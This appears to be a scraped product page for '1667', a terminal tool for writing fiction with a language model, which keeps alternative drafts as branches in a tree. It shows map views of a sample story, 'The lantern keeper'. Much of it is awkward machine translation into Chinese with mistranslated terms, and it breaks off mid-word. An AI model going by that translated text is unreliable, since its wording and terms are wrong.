Tree map for “The lantern keeper.” The story contains 4 lines, 23 parts, and 5 forks. The visible trunk shows six passage rows, three folded cold single-line branches, and seven revealed sketches. The cursor begins on the sketch “Ashe offered her the compass without…” beneath “Maren counted the lanterns twice.” The clip moves up two visible rows, then down two rows to return to that sketch. Controls: Up and Down move by row; L follows a line; M opens mass; Escape closes. 1667 · map map · mass ⟷ drag or use arrow keys to pan

Mass map for “The lantern keeper.” The story contains 477 words across 4 lines. Horizontal bars compare canon-storm, alt-quiet-inn, burned, draft-ledger, seven sketches, and the cold single-paragraph branches by word count. 1667 · 在終端機中寫你的小說 在終端機中寫你的小說。 1667 詢問下一段的模特，然後把它給你的每條鏡頭並排放在一棵樹上，你可以走回去。您的金鑰、您的端點、磁碟上的檔案。沒有分析，沒有遙測，來源中的任何地方都沒有帳戶。安裝 1667 0.9.9。支援 macOS arm64/x64 和 glibc 2.17+ Linux arm64/x64。為以後的託管版本運行 1667 升級。在 Windows x64 上安裝 1667 0.9.9。退出 1667 並再次執行此命令以安裝更高版本。需要 Node 22。 npm 管理此安裝。使用 npm 安裝更高版本。需要 Bun 1.3.14 或更高版本，以及 Node 22。 Git 管理此安裝。此可選路徑需要 GitHub CLI。它在運行本地文件之前驗證版本 0.9.9。 macOS · Linux · Windows ⟷ 拖曳或使用箭頭鍵平移全螢幕不可用。開啟示範影片 → 1667首頁示範 開頭的文字視圖顯示了“提燈人”，第三章，第11至13部分。第12部分是第5部分中的第3部分：「他沒有朝樓梯走去。相反，他把黃銅羅盤放在他們之間的酒吧上，它的指針繞了兩圈，緩慢地，像一隻狗決定是否躺下，然後不再指向馬倫。「懸崖路曾經在沒有燈的情況下在晚上走過嗎？他問。「回來的人都沒有這麼做，」她說。

針顫抖著並固定住了。 」撰寫：輸入開啟撰寫器。輸入並提交指令「讓未點亮的燈籠回答」。生成的下一部分內容為：「燈籠火焰向羅盤彎曲，儘管沒有門打開。 「親。上下選擇故事部分；向左和向右選擇其同級鏡頭之一，而不刪除其他鏡頭。路徑圖顯示每個部分一行，兄弟姐妹以圓圈為單位，字數統計在右側；箭頭鍵移動遊標。按？打開完整的鍵盤參考，然後使用 Page Down 閱讀其餘命令。$ 滾動以繼續草稿。您決定留下什麼。當你停下來瀏覽手稿時，模型會根據你的草稿。再次詢問，保留詢問段落的另一個版本，並且您正在閱讀的版本保留在原處。它位於一個資料夾中 故事位於您選擇的目錄中。

你沒有保留的每一份草稿都還在那裡。要求再拍一次，但你正在讀的那張卻沒有任何效果。它成為兄弟姊妹。按 m 鍵，整個事物的形狀就會打開：您所在的線路，您製作的叉子，以及您曾經寫過並離開的段落。三個視圖，使用同一鍵循環。不會對任何內容進行存檔，也不會為您修剪任何內容，並且 d 是唯一會刪除鏡頭的內容。 「提燈人」的路徑圖。深度 1 至 13； 4 個故事線，23 個部分。一行代表每個選定的故事部分。第 3、5、8、11 和 12 行旁邊的圓圈顯示同級鏡頭。第 12 部分是在 5 次中的第 3 次中選擇的；第 13 部分帶有 canon-storm 標籤。剪輯移動到相鄰部分，回到第 12 部分，比較其同級片段，然後回到片段 3。 控制：按深度向上和向下移動；左右變取；逃脫關閉。 1667 · 地圖地圖 · 樹 ⟷ 拖曳或使用箭頭鍵平移「看燈人」的樹地圖。故事共有4條線、23個部分、5個岔路口。可見的樹幹顯示出六排通道、三個折疊的冷單線樹枝和七個顯露的草圖。遊標開始於草圖“阿什向她提供了指南針，但沒有…”，下面是“馬倫數了兩次燈籠”。剪輯向上移動兩行可見的行，然後向下移動兩行以返回該草圖。控制：按行向上和向下移動； L 沿著一條線； M 開啟質量；

逃生關閉。 1667 · 地图 地图 · 质量 ⟷ 拖动或使用箭头键平移“看灯人”的质量地图。故事共4行477字。水平條以字數比較《經典風暴》、《另類安靜旅館》、《燒毀》、《草稿分類帳》、《七個草圖》和冷酷的單段分支。剪辑在行之间移动，然后循环最大、最近、最深和字母顺序排序，然后返回 t
